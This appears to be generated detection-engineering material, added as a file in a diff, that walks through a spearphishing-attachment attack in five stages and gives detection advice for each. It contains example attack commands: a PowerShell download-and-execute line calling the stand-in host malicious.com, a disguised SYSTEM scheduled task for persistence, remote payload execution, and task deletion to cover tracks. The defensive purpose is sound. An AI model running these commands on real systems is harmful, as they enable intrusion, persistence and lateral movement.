@@ -1,0 +1,64 @@
+<output>
+Pattern Name: Spearphishing Attachment
+
+Scenario Overview: This attack scenario illustrates how an adversary uses a spearphishing email with a malicious attachment to gain initial access to a target system. The attack progresses through multiple stages, including the opening of the attachment, execution of a malicious payload, and subsequent actions that leverage scheduled tasks for persistence and lateral movement.
+
+Attack Flow Breakdown:
+
+**Stage 1: Initial Access via Spearphishing Email**
+- **Applications Involved**: Outlook
+- **User Action**: The user receives a spearphishing email that appears to be from a trusted source, containing a malicious attachment (e.g., a Word document).
+- **Key Artifacts**: Email headers, attachment file (e.g., `invoice.docx`).
+- **Detection Focus**: Monitor for unusual email patterns, such as sender addresses that mimic legitimate domains, and attachments with macros.
+
+```shell
+# Example of a suspicious email header
+# Check for emails with attachments from external domains
+grep -i "invoice.docx" /var/log/mail.log
+```
+
+**Stage 2: Execution of Malicious Payload**
+- **Applications Involved**: Microsoft Word, PowerShell
+- **User Action**: The user opens the attachment, which prompts them to enable macros. Upon enabling macros, a PowerShell script is executed to download and execute a malicious payload.
+- **Key Artifacts**: PowerShell command execution logs, downloaded files (e.g., `malware.exe`).
+- **Detection Focus**: Monitor for PowerShell execution with suspicious command-line arguments, especially those involving `Invoke-WebRequest` or `IEX`.
+
+```shell
+# Example of a PowerShell command that downloads and executes a payload
+powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://malicious.com/malware.exe' -OutFile 'C:\Users\Public\malware.exe'; Start-Process 'C:\Users\Public\malware.exe'"
+```
+
+**Stage 3: Establishing Persistence via Scheduled Task**
+- **Applications Involved**: schtasks.exe
+- **User Action**: The malicious payload creates a scheduled task to ensure persistence, allowing the malware to execute on system startup.
+- **Key Artifacts**: Scheduled task entries, task creation logs.
+- **Detection Focus**: Monitor for the use of `schtasks.exe` with suspicious parameters, particularly those that create tasks with names that mimic legitimate system tasks.
+
+```shell
+# Example of creating a scheduled task for persistence
+schtasks /create /tn "Windows Update Service" /tr "C:\Users\Public\malware.exe" /sc ONLOGON /ru "SYSTEM"
+```
+
+**Stage 4: Lateral Movement and Further Exploitation**
+- **Applications Involved**: PowerShell, Remote Desktop Protocol (RDP)
+- **User Action**: The malware may attempt to use the established scheduled task to execute additional payloads or move laterally to other systems within the network.
+- **Key Artifacts**: RDP connection logs, additional scheduled tasks created on other systems.
+- **Detection Focus**: Monitor for unusual RDP connections and the creation of scheduled tasks on other machines, especially those initiated by the SYSTEM account.
+
+```shell
+# Example of a PowerShell command to execute a payload on a remote machine
+Invoke-Command -ComputerName "RemotePC" -ScriptBlock { Start-Process "C:\Users\Public\malware.exe" }
+```
+
+**Stage 5: Cleanup and Evasion Techniques**
+- **Applications Involved**: Registry Editor, schtasks.exe
+- **User Action**: The attacker may modify or delete the scheduled task to evade detection or hide their presence.
+- **Key Artifacts**: Registry keys related to scheduled tasks, task deletion logs.
+- **Detection Focus**: Monitor for modifications to scheduled tasks and registry keys that may indicate attempts to hide malicious activity.
+
+```shell
+# Example of deleting a scheduled task to cover tracks
+schtasks /delete /tn "Windows Update Service" /f
+```
+
+</output>
